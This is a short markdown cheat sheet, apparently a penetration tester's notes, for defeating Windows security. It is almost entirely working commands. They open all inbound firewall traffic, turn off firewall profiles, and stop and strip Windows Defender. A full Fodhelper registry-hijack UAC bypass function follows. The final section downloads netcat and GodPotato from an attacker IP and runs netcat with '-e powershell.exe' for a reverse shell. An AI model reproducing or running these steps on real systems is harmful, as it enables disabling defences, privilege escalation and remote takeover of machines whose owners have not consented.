# Bypassing Firewall/Defender/UAC

## Firewall

```powershell
New-NetFirewallRule -DisplayName "Allow All Ports and IPs" -Direction Inbound -Action Allow -Protocol Any -Profile Any -Enabled True

```



## Windows Defender

```powershell
# Identify firewall profiles for an user
netsh advfirewall show allprofiles

# Disable all firewall profiles for an user
netsh advfirewall set allprofiles state off

# Totally disable the firewall
netsh firewall set opmode disable

# Don't have powershell, use cmd.exe instead
sc stop WinDefend

# Disabling defender using powershell
Set-MpPreference -DisableRealtimeMonitoring $true

# navigate to Windows Defender directory and type the following
./mpcmdrun.exe -RemoveDefinitions -All

```



## UAC Bypass&#x20;

using FodhelperBypass.ps1

Refer -> [https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1](https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1)

```powershell
# Ran the following function in Powershell
# 
# https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1

function FodhelperBypass(){ 
 Param (
           
        [String]$program = "cmd /c start powershell.exe" #default
       )

    #Create registry structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

    #Perform the bypass
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    #Remove registry structure
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

}

# Upload netcat and godPotato into the victim machine
# ---------
## Using Netcat to Connect to the Attacker's Machine
## Elevate Shell Privileges with GodPotato
## Bypass UAC Restrictions with FodhelperBypass.ps1: The Ultimate Dream Environment for Attackers
# ---------
iwr -uri http://192.168.49.95:8000/nc.exe -outfile nc.exe
iwr -uri http://192.168.49.95:8000/god.exe -outfile god.exe


# used this function to execute nc.exe
FodhelperBypass -program "cmd.exe /c C:\Users\Tom.Davies\nc.exe 192.168.49.95 7777 -e powershell.exe"

# Setup a listener
nc -nlvp 7777

# Got a Reverse shell with UAC bypassed!
```
